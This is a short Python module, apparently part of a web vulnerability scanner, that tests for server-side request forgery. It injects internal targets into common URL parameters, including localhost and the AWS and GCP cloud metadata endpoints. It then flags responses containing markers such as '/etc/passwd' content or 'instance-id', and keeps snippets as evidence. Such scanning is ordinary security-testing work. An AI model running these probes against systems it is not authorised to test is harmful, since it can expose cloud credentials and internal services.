"""
Проверка SSRF на типовых параметрах.

Не деструктивно: смотрим только на изменение тела ответа по эвристическим
маркерам (root:x:0:0, ответы metadata-сервисов).
"""
from __future__ import annotations

from typing import Any, Callable, Dict, List

_PARAMS = [
    "url", "uri", "path", "src", "source", "target", "dest",
    "redirect", "next", "image", "img", "file", "load", "fetch",
    "proxy", "request", "endpoint", "host", "domain", "callback",
]

_TARGETS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
]

_MARKERS = [
    "root:x:0:0",
    "instance-id",
    "ami-id",
    "computeMetadata",
    "cloud-init",
]


def _looks_like_ssrf(body: str) -> str | None:
    if not body:
        return None
    for m in _MARKERS:
        if m in body:
            return m
    return None


def run(base_urls: List[str], session, log: Callable = print
        ) -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []
    for base in base_urls:
        for p in _PARAMS:
            for t in _TARGETS:
                sep = "&" if "?" in base else "?"
                url = f"{base}{sep}{p}={t}"
                r = session.get(url)
                if not r:
                    continue
                body = (r.text or "")[:4096]
                marker = _looks_like_ssrf(body)
                if marker:
                    out.append({
                        "type": "ssrf",
                        "url": url,
                        "param": p,
                        "target": t,
                        "marker": marker,
                        "status": r.status_code,
                        "evidence": body[:300],
                    })
                    break
    return out